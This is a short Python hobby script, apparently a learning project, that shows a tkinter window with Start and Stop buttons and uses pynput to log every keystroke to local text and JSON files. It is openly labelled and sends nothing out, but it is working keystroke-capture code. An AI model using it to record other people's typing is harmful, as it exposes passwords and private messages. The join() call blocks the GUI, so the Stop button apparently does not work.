
import tkinter as tk
from pynput import keyboard
import json

root = tk.Tk()
root.geometry("250x200")
root.title("Keylogger Project")

key_list = []
key_strokes = ""
is_logging = False

def update_txt_file(key):
    with open("logs.txt", 'a') as key_strokes_file:
        key_strokes_file.write(key)

def update_json_file(key_list):
    with open("logs.json", 'w') as key_log:
        json.dump(key_list, key_log)

def on_press(key):
    global is_logging, key_list
    if is_logging:
        key_list.append({'Pressed': f'{key}'})

def on_release(key):
    global is_logging, key_list, key_strokes
    if is_logging:
        key_list.append({'Released': f'{key}'})
        key_strokes += str(key) + '\n'
        update_txt_file(str(key))
        update_json_file(key_list)

def start_keylogger():
    global is_logging
    if not is_logging:
        is_logging = True
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

def stop_keylogger():
    global is_logging
    is_logging = False

empty_label = tk.Label(root, text="Keylogger Project", font='verdana 11 bold')
empty_label.pack(pady=20)

start_button = tk.Button(root, text="Start Keylogger", command=start_keylogger)
start_button.pack(pady=10)

stop_button = tk.Button(root, text="Stop Keylogger", command=stop_keylogger)
stop_button.pack(pady=5)

root.mainloop()

